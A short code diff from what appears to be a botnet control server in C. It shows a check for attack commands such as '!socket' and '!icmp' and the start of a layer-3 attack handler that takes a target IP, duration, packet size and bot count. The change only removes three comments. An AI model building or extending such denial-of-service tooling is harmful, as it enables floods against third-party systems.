@@ -57,9 +57,7 @@ int is_attack_command(const char *command) {
            strncmp(command, "!socket", 7) == 0 ||
            strncmp(command, "!icmp", 5) == 0;
 }
-// Better structure instead of adding in handle_attack_command
-// Too much work to ignore port argument in main func
-// Safe function structure
+
 void handle_layer3_attack_command(const User *user, const char *command, char *response) {
     char cmd[16], ip[32], argstr[MAX_COMMAND_LENGTH] = {0};
     int time = 0, psize = 0, botcount = 0;
